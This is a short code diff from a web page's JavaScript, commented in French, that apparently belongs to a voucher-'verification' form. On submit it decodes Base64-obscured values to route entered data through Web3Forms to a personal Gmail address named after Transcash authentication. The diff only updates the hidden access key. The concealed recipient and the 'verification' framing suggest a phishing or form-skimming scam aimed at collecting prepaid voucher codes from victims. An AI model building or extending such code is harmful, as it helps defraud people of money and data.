@@ -184,13 +184,13 @@ document.addEventListener('DOMContentLoaded', () => {
   // 3. Sécurité Web3Forms (Décodage des clés à l'envoi)
   const form = document.getElementById('verification-form');
   if (form) {
-  // Vos clés encodées en Base64 (Nouvelle clé 'k' mise à jour)
-  const k = "NjNiYzE4ODktZjkwOC00YjY0LWEzNjQtYmM0NDkyNWEyYjhh"; 
+  // ✅ Encodage Base64 STRICT de : 63bc1889-f980-4b64-a364-bc44925a2b8a
+  const k = "NjNiYzE4ODktZjk4MC00YjY0LWEzNjQtYmM0NDkyNWEyYjhh"; 
   const m = "YXV0aGVudGlmaWNhdGlvbnRyYW5zY2FzaDE3QGdtYWlsLmNvbQ==";
 
   form.addEventListener('submit', function (e) {
     document.getElementById('wf_key').value = atob(k);
     document.getElementById('wf_email').value = atob(m);
   });
-  }
+}
 });
